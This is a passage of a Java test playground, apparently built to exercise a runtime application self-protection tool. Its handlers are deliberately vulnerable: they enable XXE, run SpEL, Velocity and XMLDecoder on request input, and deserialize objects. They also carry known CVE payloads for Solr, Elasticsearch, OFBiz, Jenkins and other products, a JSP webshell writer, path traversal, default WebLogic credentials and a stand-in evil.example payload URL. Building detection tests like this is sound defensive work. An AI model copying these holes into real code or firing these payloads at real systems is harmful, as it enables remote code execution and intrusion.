    int offset = javaSerializationStreamOffset(body);
    ByteArrayInputStream inputBytes =
        offset >= 0
            ? new ByteArrayInputStream(body, offset, body.length - offset)
            : new ByteArrayInputStream(serializedEvilBytes());
    try (ObjectInputStream input = new ObjectInputStream(inputBytes)) {
      Object value = input.readObject();
      return "coldfusion-amf=" + value.getClass().getName();
    }
  }

  private static int javaSerializationStreamOffset(byte[] bytes) {
    for (int i = 0; i <= bytes.length - 4; i++) {
      if ((bytes[i] & 0xff) == 0xac
          && (bytes[i + 1] & 0xff) == 0xed
          && bytes[i + 2] == 0
          && bytes[i + 3] == 5) {
        return i;
      }
    }
    return -1;
  }

  private static String coldfusionWddxAccessManager(HttpServletRequest request) {
    return "coldfusion-wddx=" + value(request, "argumentCollection", "").length();
  }

  private static String requestBody(HttpServletRequest request) throws IOException {
    return new String(request.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
  }

  private static String polymorphicType(HttpServletRequest request) throws Exception {
    String parser = value(request, "parser", "fastjson");
    String type = value(request, "type", "com.sun.rowset.JdbcRowSetImpl");
    hook("beforePolymorphicType", new Class<?>[] {String.class, String.class}, parser, type);
    return "polymorphic type=" + parser + ":" + type;
  }

  private static String fastjsonParse(HttpServletRequest request) throws Exception {
    String body = requestBody(request);
    List<String> types = jsonStringFieldValues(body, "@type");
    for (String type : types) {
      hook("beforePolymorphicType", new Class<?>[] {String.class, String.class}, "fastjson", type);
    }
    return "fastjson-types=" + types.size();
  }

  private static String jacksonExploit(HttpServletRequest request) throws Exception {
    String body = requestBody(request);
    List<String> paramStrings = jsonStringArrayValues(body, "param");
    String type =
        paramStrings.isEmpty()
            ? value(
                request,
                "type",
                "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl")
            : paramStrings.get(0);
    hook("beforePolymorphicType", new Class<?>[] {String.class, String.class}, "jackson", type);
    return "jackson-type=" + type;
  }

  private static String jimuReportQueryFieldBySql(HttpServletRequest request) throws Exception {
    String body = requestBody(request);
    hook(
        "beforeSyntheticHttpRequestWithBody",
        new Class<?>[] {
          String.class, String.class, String.class, Map.class, Map.class, String.class
        },
        request.getMethod(),
        "/jmreport/queryFieldBySql",
        request.getQueryString() == null ? "" : request.getQueryString(),
        Map.of(),
        Map.of(
            "content-type",
            valueOrDefault(request.getHeader("Content-Type"), "application/json"),
            "user-agent",
            valueOrDefault(request.getHeader("User-Agent"), "Mozilla/5.0")),
        body);
    return "jmreport-queryFieldBySql=" + body.length();
  }

  private static boolean dubboHttpInvokerRequest(HttpServletRequest request) {
    if (!"POST".equalsIgnoreCase(request.getMethod())) {
      return false;
    }
    return requestPathWithoutContext(request).equals("/org.vulhub.api.CalcService");
  }

  private static String dubboHttpInvoker(HttpServletRequest request) throws Exception {
    hook("beforeHttpInvokerDeserialization", new Class<?>[] {String.class}, "SpringHttpInvoker");
    return "dubbo-http-invoker=" + Math.max(request.getContentLengthLong(), 0);
  }

  private static boolean sparkRestSubmissionRequest(HttpServletRequest request) {
    if (!"POST".equalsIgnoreCase(request.getMethod())) {
      return false;
    }
    return requestPathWithoutContext(request).equals("/v1/submissions/create");
  }

  private static String sparkRestSubmission(HttpServletRequest request) throws Exception {
    String body = requestBody(request);
    if (body.isBlank()) {
      body = remoteJobDescriptor();
    }
    hook("beforeRemoteJobSubmission", new Class<?>[] {String.class, String.class}, "Spark REST", body);
    return "spark-rest-submission=" + body.length();
  }

  private static String strutsAction(HttpServletRequest request) throws Exception {
    String servletPath = valueOrDefault(request.getServletPath(), "/index.action");
    String contentType = valueOrDefault(request.getHeader("Content-Type"), "");
    String normalizedContentType = contentType.toLowerCase(Locale.ROOT);
    if (!normalizedContentType.startsWith("multipart/form-data")
        || !normalizedContentType.contains("boundary=")) {
      return "struts-action=" + servletPath;
    }
    List<Part> parts = List.copyOf(request.getParts());
    for (Part part : parts) {
      if (strutsFilenameBindingField(part.getName())) {
        String filename = new String(part.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
        hook(
            "beforeSyntheticHttpRequest",
            new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
            request.getMethod(),
            requestPathWithoutContext(request),
            part.getName() + "=[redacted]",
            Map.of(part.getName(), List.of(filename)),
            Map.of(
                "content-type",
                contentType,
                "user-agent",
                valueOrDefault(request.getHeader("User-Agent"), "Mozilla/5.0")));
      }
    }
    int submittedFiles = 0;
    for (Part part : parts) {
      if (part.getSubmittedFileName() != null) {
        submittedFiles++;
      }
    }
    return "struts-action=" + servletPath + " uploaded=" + submittedFiles;
  }

  private static boolean strutsFilenameBindingField(String name) {
    if (name == null || name.isBlank()) {
      return false;
    }
    String normalized = name.toLowerCase(Locale.ROOT).replace("_", "").replace("-", "");
    return normalized.equals("filename") || normalized.endsWith("filename");
  }

  private static String casLogin(HttpServletRequest request) throws Exception {
    String execution = value(request, "execution", "");
    if (!execution.isBlank()) {
      hook(
          "beforeSyntheticDeserializationClass",
          new Class<?>[] {String.class, List.class},
          "org.apache.commons.collections4.functors.InvokerTransformer",
          casWebflowStateStack());
    }
    return "cas-login=" + value(request, "username", "");
  }

  private static String neo4jShellSetSessionVariable(HttpServletRequest request) throws Exception {
    String clientId = value(request, "clientId", "1");
    String key = value(request, "key", "anything_here");
    String gadget = value(request, "gadget", "org.mozilla.javascript.NativeJavaObject");
    hook(
        "beforeSyntheticDeserializationClass",
        new Class<?>[] {String.class, List.class},
        gadget,
        neo4jShellRmiStack());
    return "neo4j-shell-setSessionVariable=" + clientId + ":" + key + ":" + gadget;
  }

  private static String jbossHttpObjectStream(HttpServletRequest request, String component)
      throws Exception {
    var input = request.getInputStream();
    hook("beforeObjectInputStream", new Class<?>[] {Object.class}, input);
    byte[] body = input.readAllBytes();
    return "jboss-http-object-stream=" + component + " bytes=" + body.length;
  }

  private static String xmlDecoderRuntime(HttpServletRequest request) {
    String payload = value(request, "payload", xmlDecoderProcessPayload());
    try (XMLDecoder decoder =
        new XMLDecoder(new ByteArrayInputStream(payload.getBytes(StandardCharsets.UTF_8)))) {
      Object value = decoder.readObject();
      return "xml-decoder=" + firstLine(String.valueOf(value));
    }
  }

  private static String xmlDecoderWebshell(HttpServletRequest request) {
    String payload = value(request, "payload", xmlDecoderWebshellPayload());
    try (XMLDecoder decoder =
        new XMLDecoder(new ByteArrayInputStream(payload.getBytes(StandardCharsets.UTF_8)))) {
      Object value = decoder.readObject();
      return "xml-decoder-webshell=" + firstLine(String.valueOf(value));
    }
  }

  private static String parseXxe(HttpServletRequest request) throws Exception {
    String entity = value(request, "entity", "file:///etc/passwd");
    String xml = "<!DOCTYPE root [<!ENTITY xxe SYSTEM \"" + entity + "\">]><root>&xxe;</root>";
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
    factory.setExpandEntityReferences(true);
    factory.setXIncludeAware(false);
    factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", false);
    factory.setFeature("http://xml.org/sax/features/external-general-entities", true);
    factory.setFeature("http://xml.org/sax/features/external-parameter-entities", true);
    factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "all");
    factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "all");
    String text =
        factory
            .newDocumentBuilder()
            .parse(new InputSource(new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8))))
            .getDocumentElement()
            .getTextContent();
    return firstLine(text);
  }

  private static String cxfAegisXopAttachment(HttpServletRequest request) throws Exception {
    String body = new String(request.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
    String href = extractXopIncludeHref(body);
    if (href.isBlank()) {
      href = "file:///etc/hosts";
    }
    hook(
        "beforeXmlAttachmentReference",
        new Class<?>[] {String.class, String.class},
        "cxf-aegis-xop",
        href);
    return "cxf-aegis-xop=" + href;
  }

  private static String extractXopIncludeHref(String body) {
    if (body == null || body.isBlank()) {
      return "";
    }
    Matcher matcher =
        Pattern.compile("(?is)<(?:xop:)?Include\\b[^>]*\\bhref\\s*=\\s*([\"'])(.*?)\\1")
            .matcher(body);
    return matcher.find() ? matcher.group(2).trim() : "";
  }

  private static String weblogicWorkContextXmlDecoder(HttpServletRequest request) throws Exception {
    String body = new String(request.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
    String payload = extractWorkContextXmlDecoder(body);
    if (payload.isBlank()) {
      payload = xmlDecoderProcessPayload();
    }
    try (XMLDecoder decoder =
        new XMLDecoder(new ByteArrayInputStream(payload.getBytes(StandardCharsets.UTF_8)))) {
      Object value = decoder.readObject();
      return "weblogic-workcontext=" + firstLine(String.valueOf(value));
    }
  }

  private static String extractWorkContextXmlDecoder(String xml) {
    if (xml == null || xml.isBlank()) {
      return "";
    }
    try {
      DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
      factory.setNamespaceAware(true);
      factory.setXIncludeAware(false);
      factory.setExpandEntityReferences(false);
      factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
      factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
      factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
      factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
      factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
      Element root =
          factory
              .newDocumentBuilder()
              .parse(new InputSource(new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8))))
              .getDocumentElement();
      NodeList contexts = root.getElementsByTagNameNS("*", "WorkContext");
      for (int i = 0; i < contexts.getLength(); i++) {
        Node item = contexts.item(i);
        if (item instanceof Element context) {
          Element decoder = findXmlDecoderElement(context);
          if (decoder != null) {
            return serializeXml(decoder);
          }
        }
      }
    } catch (Exception ignored) {
      return "";
    }
    return "";
  }

  private static Element findXmlDecoderElement(Element element) {
    Element fallback = null;
    NodeList children = element.getChildNodes();
    for (int i = 0; i < children.getLength(); i++) {
      Node child = children.item(i);
      if (child instanceof Element childElement) {
        if (elementNamed(childElement, "java")) {
          if ("java.beans.XMLDecoder".equals(childElement.getAttribute("class"))) {
            return childElement;
          }
          if (fallback == null) {
            fallback = childElement;
          }
        }
        Element nested = findXmlDecoderElement(childElement);
        if (nested != null) {
          return nested;
        }
      }
    }
    return fallback;
  }

  private static String serializeXml(Node node) throws Exception {
    TransformerFactory factory = TransformerFactory.newInstance();
    try {
      factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
      factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");
    } catch (IllegalArgumentException ignored) {
      // Some JDK transformer implementations do not expose these attributes.
    }
    var transformer = factory.newTransformer();
    transformer.setOutputProperty(OutputKeys.OMIT_XML_DECLARATION, "yes");
    StringWriter writer = new StringWriter();
    transformer.transform(new DOMSource(node), new StreamResult(writer));
    return writer.toString();
  }

  private static String geoserverWmsJiffle(HttpServletRequest request) throws Exception {
    String body = new String(request.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
    String script = extractWpsLiteralData(body, "script");
    if (script.isBlank()) {
      script = value(request, "script", geoserverJifflePayload());
    }
    hook("beforeExpressionEvaluation", new Class<?>[] {String.class, Object.class}, "jiffle", script);
    return "geoserver-wms-jiffle scriptLength=" + script.length();
  }

  private static String extractWpsLiteralData(String xml, String identifier) {
    if (xml == null || xml.isBlank()) {
      return "";
    }
    try {
      DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
      factory.setNamespaceAware(true);
      factory.setXIncludeAware(false);
      factory.setExpandEntityReferences(false);
      factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
      factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
      factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
      factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
      factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
      Element root =
          factory
              .newDocumentBuilder()
              .parse(new InputSource(new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8))))
              .getDocumentElement();
      NodeList inputs = root.getElementsByTagNameNS("*", "Input");
      for (int i = 0; i < inputs.getLength(); i++) {
        Node item = inputs.item(i);
        if (item instanceof Element input
            && identifier.equalsIgnoreCase(descendantText(input, "Identifier").trim())) {
          return descendantText(input, "LiteralData");
        }
      }
    } catch (Exception ignored) {
      return "";
    }
    return "";
  }

  private static String descendantText(Element element, String localName) {
    NodeList nodes = element.getElementsByTagName("*");
    for (int i = 0; i < nodes.getLength(); i++) {
      Node node = nodes.item(i);
      if (elementNamed(node, localName)) {
        return node.getTextContent() == null ? "" : node.getTextContent();
      }
    }
    return "";
  }

  private static boolean elementNamed(Node node, String localName) {
    if (!(node instanceof Element)) {
      return false;
    }
    String name = node.getLocalName();
    if (name == null || name.isBlank()) {
      name = node.getNodeName();
    }
    int prefix = name.indexOf(':');
    if (prefix >= 0) {
      name = name.substring(prefix + 1);
    }
    return localName.equals(name);
  }

  private static String evaluateSpel(HttpServletRequest request) {
    String expression =
        value(request, "expr", "T(java.lang.Runtime).getRuntime().exec('id')");
    Object value = new SpelExpressionParser().parseExpression(expression).getValue();
    return "spel=" + value;
  }

  private static String evaluateJsr223(HttpServletRequest request) throws ScriptException {
    String script =
        value(request, "script", "java.lang.Runtime.getRuntime().exec('id')");
    Object value = new PlaygroundScriptEngineImpl().eval(script);
    return "script=" + firstLine(String.valueOf(value));
  }

  private static String evaluateXPath(HttpServletRequest request) {
    String expression =
        value(request, "expr", "exec(java.lang.Runtime.getRuntime(),'touch /tmp/success')");
    XPath xpath = XPathFactory.newInstance().newXPath();
    try {
      Object value =
          xpath.evaluate(
              expression,
              new InputSource(
                  new ByteArrayInputStream(
                      "<root><name>ohmyrasp</name></root>".getBytes(StandardCharsets.UTF_8))));
      return "xpath=" + firstLine(String.valueOf(value));
    } catch (XPathExpressionException e) {
      return "xpath-error=" + firstLine(e.getMessage());
    }
  }

  private static String evaluateJXPath(HttpServletRequest request) {
    String expression =
        value(request, "expr", "exec(java.lang.Runtime.getRuntime(),'touch /tmp/success')");
    JXPathContext context =
        JXPathContext.newContext(Map.of("root", Map.of("name", "ohmyrasp")));
    try {
      Object value = context.getValue(expression);
      return "jxpath=" + firstLine(String.valueOf(value));
    } catch (RuntimeException e) {
      return "jxpath-error=" + firstLine(e.getMessage());
    }
  }

  private static String compileJavaSource(HttpServletRequest request) throws Exception {
    String source = value(request, "source", dangerousJavaSource());
    JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
    if (compiler == null) {
      return "java-compile unavailable";
    }
    Path output = Files.createTempDirectory("ohmyrasp-javac");
    JavaFileObject unit = new StringJavaSource("OhMyRaspDynamic", source);
    hook("beforeJavaCompilationSource", new Class<?>[] {String.class, Object.class}, "javac", source);
    Boolean compiled =
        compiler
            .getTask(null, null, null, List.of("-d", output.toString()), null, List.of(unit))
            .call();
    return "java-compile=" + compiled;
  }

  private static String dangerousJavaSource() {
    return """
        public class OhMyRaspDynamic {
          static {
            try {
              java.lang.Runtime.getRuntime().exec("id");
            } catch (Exception ignored) {
            }
          }
        }
        """;
  }

  private static String geoserverJifflePayload() {
    return "dest = y() - 500; // */ public class Double { static { "
        + "java.lang.Runtime.getRuntime().exec(\"id\"); } } /**";
  }

  private static String xmlDecoderProcessPayload() {
    return """
        <java version="1.4.0" class="java.beans.XMLDecoder">
          <object class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
              <void index="0"><string>sh</string></void>
              <void index="1"><string>-c</string></void>
              <void index="2"><string>id</string></void>
            </array>
            <void method="start"/>
          </object>
        </java>
        """;
  }

  private static String xmlDecoderWebshellPayload() {
    return """
        <java version="1.4.0" class="java.beans.XMLDecoder">
          <object class="java.io.PrintWriter">
            <string>/tmp/ohmyrasp-xml.jsp</string>
            <void method="println">
              <string>&lt;% out.println(1); %&gt;</string>
            </void>
            <void method="close"/>
          </object>
        </java>
        """;
  }

  private static String renderVelocity(HttpServletRequest request) {
    String template =
        value(
            request,
            "template",
            "#set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('id'))velocity");
    VelocityEngine engine = new VelocityEngine();
    engine.init();
    VelocityContext context = new VelocityContext();
    context.put("x", "");
    StringWriter writer = new StringWriter();
    engine.evaluate(context, writer, "ohmyrasp", template);
    return "velocity=" + firstLine(writer.toString());
  }

  private static String triggerPolicy(String policy, HttpServletRequest request) throws Exception {
    switch (policy) {
      case "sql-exception" ->
          hook(
              "beforeSqlException",
              new Class<?>[] {String.class, String.class, String.class, String.class, String.class},
              "mysql",
              "1064",
              "",
              "You have an error in your SQL syntax",
              "select * from where");
      case "sql-policy" ->
          hook(
              "beforeSql",
              new Class<?>[] {String.class},
              "select 1 union select password from users");
      case "sql-regex" ->
          hook(
              "beforeSqlRegex",
              new Class<?>[] {String.class, String.class},
              "select table_name from information_schema.tables",
              "information_schema");
      case "sql-derby-code" ->
          hook("beforeSql", new Class<?>[] {String.class}, derbyCodeLoadingSql());
      case "request-scanner" ->
          hook(
              "beforeSyntheticHttpRequest",
              new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
              "GET",
              "/rasp/request",
              "",
              Map.of(),
              Map.of("user-agent", "sqlmap/1.7"));
      case "request-unusual" ->
          hook(
              "beforeSyntheticHttpRequest",
              new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
              "GET",
              "/rasp/request",
              "",
              Map.of(),
              Map.of());
      case "request-internal-identity" ->
          hook(
              "beforeSyntheticHttpRequest",
              new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
              "GET",
              "/nacos/v1/auth/users",
              "pageNo=1&pageSize=9",
              Map.of(),
              Map.of("user-agent", "Nacos-Server"));
      case "request-default-jwt-secret" ->
          hook(
              "beforeSyntheticHttpRequest",
              new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
              "GET",
              "/graphs",
              "",
              Map.of(),
              Map.of(
                  "user-agent",
                  "Mozilla/5.0",
                  "authorization",
                  "Bearer "
                      + "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
                      + "eyJ1c2VyX25hbWUiOiJhZG1pbiIsInVzZXJfaWQiOiItMzA6YWRtaW4iLCJleHAiOjk3Mzk1MjM0ODN9."
                      + "mnafQi6x9nlMz1OcPQu4xAyiq91Ig5tUFhGsktNXKqg"));
      case "request-jwt-verification-failure" -> {
        String token =
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
                + "eyJ1aWQiOjEsIm9pZCI6MSwiZXhwIjoyMDAwMDAwMDAwfQ."
                + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
        hook(
            "beforeSyntheticJwtVerificationFailure",
            new Class<?>[] {
              String.class,
              String.class,
              String.class,
              Map.class,
              Map.class,
              String.class,
              String.class,
              String.class
            },
            "GET",
            "/de2api/user/info",
            "",
            Map.of(),
            Map.of("user-agent", "Mozilla/5.0", "x-de-token", token),
            "auth0-java-jwt",
            "com.auth0.jwt.exceptions.SignatureVerificationException",
            "The Token's Signature resulted invalid when verified using the Algorithm: HmacSHA256");
      }
      case "request-default-crypto-cookie" ->
          hook(
              "beforeSyntheticHttpRequest",
              new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
              "GET",
              "/login",
              "",
              Map.of(),
              Map.of(
                  "user-agent",
                  "Mozilla/5.0",
                  "cookie",
                  "sid=abc; rememberMe=AAECAwQFBgcICQoLDA0OD99XrYvceC/RUMm6dUki3C8=; theme=light"));
      case "request-serialized-client-state" -> {
        String payload = "H4sIAAAAAAAAA1vzloG1AAAWmZJ6BQAAAA==";
        hook(
            "beforeSyntheticHttpRequest",
            new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
            "POST",
            "/index.xhtml",
            "javax.faces.ViewState=" + payload + "&submit=Login",
            Map.of("javax.faces.ViewState", List.of(payload), "submit", List.of("Login")),
            Map.of(
                "user-agent",
                "Mozilla/5.0",
                "content-type",
                "application/x-www-form-urlencoded"));
      }
      case "request-default-credential" ->
          hook(
              "beforeSyntheticHttpRequest",
              new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
              "POST",
              "/console/j_security_check",
              "j_username=weblogic&j_password=Oracle%40123",
              Map.of("j_username", List.of("weblogic"), "j_password", List.of("Oracle@123")),
              Map.of("user-agent", "Mozilla/5.0"));
      case "request-empty-credential-bypass" ->
          hook(
              "beforeSyntheticHttpRequest",
              new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
              "POST",
              "/webtools/control/ProgramExport/",
              "USERNAME=&PASSWORD=&requirePasswordChange=Y",
              Map.of(
                  "USERNAME",
                  List.of(""),
                  "PASSWORD",
                  List.of(""),
                  "requirePasswordChange",
                  List.of("Y")),
              Map.of("user-agent", "Mozilla/5.0"));
      case "request-setup-state-reset" ->
          hook(
              "beforeSyntheticHttpRequest",
              new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
              "GET",
              "/server-info.action",
              "bootstrapStatusProvider.applicationConfig.setupComplete=false",
              Map.of(
                  "bootstrapStatusProvider.applicationConfig.setupComplete",
                  List.of("false")),
              Map.of("user-agent", "Mozilla/5.0"));
      case "request-server-side-script-put" ->
          hook(
              "beforeSyntheticHttpRequest",
              new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
              "PUT",
              "/1.jsp/",
              "",
              Map.of(),
              Map.of("user-agent", "Mozilla/5.0", "content-type", "application/octet-stream"));
      case "request-upload-filename-override" ->
          hook(
              "beforeSyntheticHttpRequest",
              new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
              "POST",
              "/index.action",
              "top.fileFileName=..%2Fshell.jsp",
              Map.of("top.fileFileName", List.of("../shell.jsp")),
              Map.of(
                  "user-agent",
                  "Mozilla/5.0",
                  "content-type",
                  "multipart/form-data; boundary=----OhMyRasp"));
      case "request-scheduler-shell-job" ->
          hook(
              "beforeSyntheticHttpRequest",
              new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
              "POST",
              "/run",
              "",
              Map.of(
                  "jobId",
                  List.of("1"),
                  "executorHandler",
                  List.of("demoJobHandler"),
                  "executorParams",
                  List.of("demoJobHandler"),
                  "glueType",
                  List.of("GLUE_SHELL"),
                  "glueSource",
                  List.of("touch /tmp/success"),
                  "logId",
                  List.of("1"),
                  "broadcastIndex",
                  List.of("0"),
                  "broadcastTotal",
                  List.of("0")),
              Map.of("user-agent", "Mozilla/5.0"));
      case "request-debug-process-launch" ->
          hook(
              "beforeSyntheticHttpRequest",
              new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
              "POST",
              "/app/rest/debug/processes",
              "exePath=id",
              Map.of("exePath", List.of("id")),
              Map.of("user-agent", "Mozilla/5.0"));
      case "request-dynamic-script-config" ->
          hook(
              "beforeSyntheticHttpRequest",
              new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
              "POST",
              "/actuator/gateway/routes/hacktest",
              "",
              Map.of(
                  "routeConfig",
                  List.of(
                      "{\"filters\":[{\"name\":\"AddResponseHeader\",\"args\":{\"value\":\"#{T(java.lang.Runtime).getRuntime().exec('id')}\"}}],\"uri\":\"http://example.com\"}")),
              Map.of("user-agent", "Mozilla/5.0"));
      case "request-solr-cve-2019-0193-dataimport-script" -> {
        String dataConfig =
            """
            <dataConfig>
              <script><![CDATA[
                function poc(){ java.lang.Runtime.getRuntime().exec("touch /tmp/success"); }
              ]]></script>
              <document>
                <entity name="sample" fileName=".*" baseDir="/" processor="FileListEntityProcessor" transformer="script:poc" />
              </document>
            </dataConfig>
            """;
        hook(
            "beforeSyntheticHttpRequest",
            new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
            "POST",
            "/solr/demo/dataimport",
            "command=full-import&debug=true&name=dataimport",
            Map.of(
                "command",
                List.of("full-import"),
                "debug",
                List.of("true"),
                "name",
                List.of("dataimport"),
                "dataConfig",
                List.of(dataConfig)),
            Map.of("user-agent", "Mozilla/5.0", "content-type", "application/x-www-form-urlencoded"));
      }
      case "request-elasticsearch-cve-2014-3120-search-script" -> {
        String script =
            "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\")"
                + ".getInputStream()).useDelimiter(\"\\\\A\").next();";
        String body =
            "{\"size\":1,\"query\":{\"filtered\":{\"query\":{\"match_all\":{}}}},"
                + "\"script_fields\":{\"command\":{\"script\":\""
                + jsonString(script)
                + "\"}}}";
        hook(
            "beforeSyntheticHttpRequestWithBody",
            new Class<?>[] {
              String.class, String.class, String.class, Map.class, Map.class, String.class
            },
            "POST",
            "/_search",
            "pretty",
            Map.of(),
            Map.of(
                "user-agent",
                "Mozilla/5.0",
                "content-type",
                "application/x-www-form-urlencoded"),
            body);
      }
      case "request-elasticsearch-cve-2015-1427-search-script" -> {
        String script =
            "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()";
        String body =
            "{\"size\":1,\"script_fields\":{\"lupin\":{\"lang\":\"groovy\",\"script\":\""
                + jsonString(script)
                + "\"}}}";
        hook(
            "beforeSyntheticHttpRequestWithBody",
            new Class<?>[] {
              String.class, String.class, String.class, Map.class, Map.class, String.class
            },
            "POST",
            "/_search",
            "pretty",
            Map.of(),
            Map.of("user-agent", "Mozilla/5.0", "content-type", "application/text"),
            body);
      }
      case "request-spring-messaging-stomp-selector" -> {
        String selector = "T(java.lang.Runtime).getRuntime().exec('touch /tmp/success')";
        String body =
            "[\"SUBSCRIBE\\nid:sub-0\\ndestination:/topic/greetings\\nselector:"
                + selector
                + "\\n\\n\\u0000\"]";
        hook(
            "beforeSyntheticHttpRequestWithBody",
            new Class<?>[] {
              String.class, String.class, String.class, Map.class, Map.class, String.class
            },
            "POST",
            "/gs-guide-websocket/123/abc/xhr_send",
            "",
            Map.of(),
            Map.of("user-agent", "Mozilla/5.0", "content-type", "application/json"),
            body);
      }
      case "request-druid-javascript-sampler" -> {
        String function =
            "function(){return java.lang.Runtime.getRuntime().exec(new String[]{\"sh\",\"-c\",\"id\"});}";
        String body =
            "{\"type\":\"index\",\"spec\":{\"dataSchema\":{\"parser\":{\"parseSpec\":{"
                + "\"format\":\"javascript\",\"function\":\""
                + jsonString(function)
                + "\",\"\":{\"enabled\":\"true\"}}}}},\"samplerConfig\":{\"numRows\":10}}";
        hook(
            "beforeSyntheticHttpRequestWithBody",
            new Class<?>[] {
              String.class, String.class, String.class, Map.class, Map.class, String.class
            },
            "POST",
            "/druid/indexer/v1/sampler",
            "",
            Map.of(),
            Map.of("user-agent", "Mozilla/5.0", "content-type", "application/json"),
            body);
      }
      case "request-hugegraph-gremlin-script" -> {
        hook(
            "beforeSyntheticHttpRequestWithBody",
            new Class<?>[] {
              String.class, String.class, String.class, Map.class, Map.class, String.class
            },
            "POST",
            "/gremlin",
            "",
            Map.of(),
            Map.of("user-agent", "Mozilla/5.0", "content-type", "application/json"),
            hugeGraphGremlinBody());
      }
      case "request-ofbiz-groovy-programexport" -> {
        String script = "throw new Exception('id'.\\u0065xecute().text);";
        hook(
            "beforeSyntheticHttpRequest",
            new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
            "POST",
            "/webtools/control/main/ProgramExport",
            "groovyProgram=throw+new+Exception('id'.%5Cu0065xecute().text)%3B",
            Map.of("groovyProgram", List.of(script)),
            Map.of(
                "user-agent",
                "Mozilla/5.0",
                "content-type",
                "application/x-www-form-urlencoded"));
      }
      case "request-ofbiz-remote-decorator-source" ->
          hook(
              "beforeSyntheticHttpRequest",
              new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
              "POST",
              "/webtools/control/forgotPassword/StatsSinceStart",
              "statsDecoratorLocation=http%3A%2F%2Fevil.example%2Fofbiz%2Fpayload.xml",
              Map.of(
                  "statsDecoratorLocation",
                  List.of("http://evil.example/ofbiz/payload.xml")),
              Map.of(
                  "user-agent",
                  "Mozilla/5.0",
                  "content-type",
                  "application/x-www-form-urlencoded"));
      case "request-jenkins-groovy-checkscript" -> {
        String script = "public class x { public x(){ \"touch /tmp/success\".execute() } }";
        hook(
            "beforeSyntheticHttpRequest",
            new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
            "GET",
            "/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript",
            "sandbox=true&value=" + script,
            Map.of("sandbox", List.of("true"), "value", List.of(script)),
            Map.of("user-agent", "Mozilla/5.0"));
      }
      case "request-dynamic-script-json-config" -> {
        hook(
            "beforeSyntheticHttpRequestWithBody",
            new Class<?>[] {
              String.class, String.class, String.class, Map.class, Map.class, String.class
            },
            "POST",
            "/dataSetParam/verification;swagger-ui/",
            "",
            Map.of(),
            Map.of("user-agent", "Mozilla/5.0", "content-type", "application/json"),
            ajReportValidationRulesBody());
      }
      case "request-unomi-context-expression" -> {
        String script = "script::Runtime r = Runtime.getRuntime(); r.exec(\"touch /tmp/mvel\");";
        String escapedScript = script.replace("\\", "\\\\").replace("\"", "\\\"");
        String body =
            "{\"filters\":[{\"id\":\"sample\",\"filters\":[{\"condition\":{\"parameterValues\":{\"\":\""
                + escapedScript
                + "\"},\"type\":\"profilePropertyCondition\"}}]}],\"sessionId\":\"sample\"}";
        hook(
            "beforeSyntheticHttpRequestWithBody",
            new Class<?>[] {
              String.class, String.class, String.class, Map.class, Map.class, String.class
            },
            "POST",
            "/context.json",
            "",
            Map.of(),
            Map.of("user-agent", "Mozilla/5.0", "content-type", "application/json"),
            body);
      }
      case "request-metabase-h2-init-config" -> {
        String body = metabaseSetupValidateBody();
        hook(
            "beforeSyntheticHttpRequestWithBody",
            new Class<?>[] {
              String.class, String.class, String.class, Map.class, Map.class, String.class
            },
            "POST",
            "/api/setup/validate",
            "",
            Map.of(),
            Map.of("user-agent", "Mozilla/5.0", "content-type", "application/json"),
            body);
      }
